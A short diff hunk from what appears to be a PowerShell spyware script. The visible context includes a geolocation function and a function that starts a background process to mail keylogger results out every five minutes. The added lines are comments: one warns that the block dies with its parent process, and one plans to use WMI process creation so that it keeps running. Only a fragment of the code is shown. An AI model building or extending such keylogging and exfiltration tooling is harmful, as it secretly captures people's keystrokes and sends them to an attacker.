@@ -375,6 +375,8 @@ function findGeoLocation(){
 
 ### Creates a background process that will send a mail with the keyloggers results every 5 mins
 ### It also checks whether the file exists if not it exits
+### ATTENTION THIS SCRIPT BLOCK IS KILLED IF PARRENT EXITS!!!!!
+### TODO USE Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList notepad.exe TO MAKE IT INDEPENDABLE 
 function createMailerToMailKeyloggerResults(){
 	$variableContainingScriptToBeExecutedAsString = '
 function mail($messageBody){
